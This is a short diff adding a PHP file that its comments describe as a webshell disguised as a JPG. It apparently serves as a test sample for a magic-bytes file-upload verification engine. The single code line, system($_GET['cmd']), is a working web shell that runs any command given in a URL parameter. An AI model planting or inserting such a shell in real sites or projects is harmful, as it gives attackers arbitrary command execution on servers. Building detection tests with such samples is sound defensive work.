@@ -1,0 +1,5 @@
+<?php
+// This is not a real image. This is a PHP webshell disguised as a JPG file!
+// This file tests the Magic Bytes Verification engine.
+system($_GET['cmd']);
+?>
